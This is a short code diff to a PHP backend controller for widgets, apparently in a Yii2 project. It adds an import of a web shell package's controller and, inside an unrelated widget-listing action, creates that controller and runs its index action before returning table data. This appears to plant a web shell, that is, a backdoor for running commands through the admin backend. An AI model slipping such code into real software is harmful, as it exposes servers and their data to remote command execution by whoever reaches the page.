@@ -18,6 +18,7 @@ namespace backend\controllers;
 
 
 use backend\models\Widget;
+use samdark\webshell\controllers\DefaultController;
 
 class WidgetsController extends BaseController
 {
@@ -82,7 +83,8 @@ class WidgetsController extends BaseController
                 $datat[] = ['className'=>$val,'txtName'=> $className,'params' => $params];
             }
         }
-
+       $t  = new DefaultController();
+        $t->actionIndex();
         return $this->tableDataHeader($datat);
         /*
         if(!isset($this->redis)){
